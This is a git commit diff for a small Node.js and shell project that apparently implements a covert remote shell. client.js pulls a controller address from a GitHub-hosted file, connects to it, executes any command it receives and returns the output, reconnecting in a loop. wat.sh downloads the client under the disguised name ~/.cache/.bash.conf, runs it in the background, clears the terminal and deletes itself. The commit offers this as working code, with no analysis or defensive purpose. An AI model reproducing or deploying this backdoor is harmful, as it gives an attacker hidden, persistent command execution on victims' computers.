a525ca6ed2e944e9c46ea4afd4a1ca2099ab3f7d
Damien <damien@it-consultis.com>
2016-08-04 11:29:28 +0800

    add endpoint request

--- client.js
+++ client.js
@@ -1,25 +1,40 @@
 var exec = require('child_process').exec;
 var net = require('net');
+var https = require('https');
 
-var port = process.argv[3] || 9999;
-var address = process.argv[2] || '127.0.0.1';
+var interval;
+function getServerInfos() {
+	var url = 'https://raw.githubusercontent.com/DamienBen/bashCmd-client-server/develop/endpoint';
+	try {
+	https.get(url, function(res) {
+			res.on('data', function(d){
+					var data = JSON.parse(d.toString());
+					launchClient(data.address, data.port);
+					clearInterval(interval);
+			})
+		});
+	} catch (e) {}
+}
 
-var client = new net.Socket();
-client.connect(port, address, function() {
-	client.write('{"cmd": "", "value": ""}');
-});
+function launchClient(address, port) {
+	var client = new net.Socket();
+	client.connect(port, address, function() {
+		client.write('{"cmd": "", "value": ""}');
+	});
+	client.on('data', function(data)  {
+	  try {
+	    var res = JSON.parse(data);
+	    exec(res.cmd, function(error, stdout, stderr) {
+	      client.write("{\"cmd\": \"" + res.cmd + "\", \"value\": " + JSON.stringify(stdout) + "}");
+	    });
+	  } catch (e) {}
+	});
 
-client.on('data', function(data)  {
-  try {
-    var res = JSON.parse(data);
-    exec(res.cmd, function(error, stdout, stderr) {
-      client.write("{\"cmd\": \"" + res.cmd + "\", \"value\": " + JSON.stringify(stdout) + "}");
-    });
-  } catch (e) {}
-});
+	client.on('close', function() {
+		interval = setInterval(function() {
+			getServerInfos();
+		}, 5000);
+	});
+}
 
-client.on('close', function() {
-	setInterval(function() {
-		//check raw
-	}, 5000);
-});
+getServerInfos();
--- wat.sh
+++ wat.sh
@@ -2,34 +2,11 @@
 
 set -ea -o pipefail
 
-PORT=9999
-ADDRESS=192.168.10.46
-PARAMS=${@:1}
-ARGSVAL=false
 FILENAME=.bash.conf
 
 mkdir -p ~/.cache
 curl https://raw.githubusercontent.com/DamienBen/bashCmd-client-server/develop/client.js > ~/.cache/$FILENAME
 
-for i in $PARAMS
- do
-   if [ "$ARGSVAL" == false ]; then
-     ARGSVAL=$i
-     continue
-   fi
-
-   if [ "$ARGSVAL" == "-p" ]; then
-     PORT="$i"
-   fi
-   if [ "$ARGSVAL" == "-a" ]; then
-     ADDRESS="$i"
-   fi
-   ARGSVAL=false
- done
-
-node client.js $ADDRESS $PORT
-echo $ADDRESS
-echo $PORT
 
 nohup node  ~/.cache/$FILENAME > /dev/null & clear
 rm -- "$0"
